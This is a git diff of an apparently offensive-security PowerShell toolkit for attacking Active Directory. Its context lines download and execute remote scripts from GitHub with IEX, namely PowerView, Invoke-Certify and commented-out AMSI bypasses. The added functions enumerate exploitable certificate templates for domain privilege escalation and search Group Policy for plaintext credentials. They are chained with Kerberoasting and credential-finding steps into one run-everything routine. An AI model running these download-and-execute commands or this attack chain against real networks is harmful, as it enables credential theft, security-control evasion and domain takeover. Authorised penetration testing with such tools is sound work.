@@ -2,6 +2,7 @@ $currentPath = Get-Location
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/xXxhagenxXx/offsec/main/PowerView.ps1')
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/xXxhagenxXx/offsec/main/Invoke-Certify.ps1')
 
+
 #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/xXxhagenxXx/offsec/main/amsibypass1.ps1')
 #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/xXxhagenxXx/offsec/main/amsibypass2.ps1')
 
@@ -124,29 +125,52 @@ function PWdOnDescription{
 .DESCRIPTION
     The function enumerates misconfigured AD Certificates which can be used for domain privilege escalation e.g. Domain Administrator impersonation.
 
-.PARAMETER Command
-    A parameter to specify what command will be run on the Certipy.exe.
+.PARAMETER Domain
+    Required parameter to specify the domain name to use for the gathering of information.
 
 .EXAMPLE
-   Certify
-   Default value of the command will look for vulnerable certificate.
+    Certify -Domain example.com
     
-.EXAMPLE
-   Certify -Command "find /vulnerable /domain:example.com"
-   The parameter can be customized to query specified domain, used in a non-domain joined computer.
-   
 .NOTES
     Author: Netsync Offsec
     Version: 1.0
 #>
 
 function Certify{
-    param($Command = "find /vulnerable")
+    param($Domain)
                 if (-not (Test-Path "$currentPath\VulnerableADCertificates")) {
         New-Item -ItemType Directory -Path "$currentPath\VulnerableADCertificates"
     }
-    Invoke-Certify -Command $Command | Out-File -FilePath "$currentPath\VulnerableADCertificates\VulnerableADCertificates.txt"
+    Invoke-Certify -Command "find /vulnerable /domain:$Domain" | Out-File -FilePath "$currentPath\VulnerableADCertificates\VulnerableADCertificates.txt"
 }
+
+
+<#
+.SYNOPSIS
+    Function used to enumerate misconfigured Active Directory Group Policy.
+
+.DESCRIPTION
+    The function enumerates misconfigured Group Policy e.g. plain text credentials.
+
+.PARAMETER Domain
+    Required parameter to specify the domain name to use for the gathering of information.
+
+.EXAMPLE
+    Grouper -Domain example.com
+    
+.NOTES
+    Author: Netsync Offsec
+    Version: 1.0
+#>
+
+function Grouper{
+    param($Domain)
+                if (-not (Test-Path "$currentPath\Grouper")) {
+        New-Item -ItemType Directory -Path "$currentPath\Grouper"
+    }
+    Invoke-Grouper -Command "--domain $Domain -a 3 -s" | Out-File -FilePath "$currentPath\Grouper\Grouper.txt"
+}
+
 
 <#
 .SYNOPSIS
@@ -171,4 +195,6 @@ function Invoke-AllCommands {
     KerberoastHashes -Domain $Domain
     CredentialFinder -Domain $Domain
     PWdOnDescription -Domain $Domain
+    Certify -Domain $Domain
+    Grouper -Domain $Domain
 }
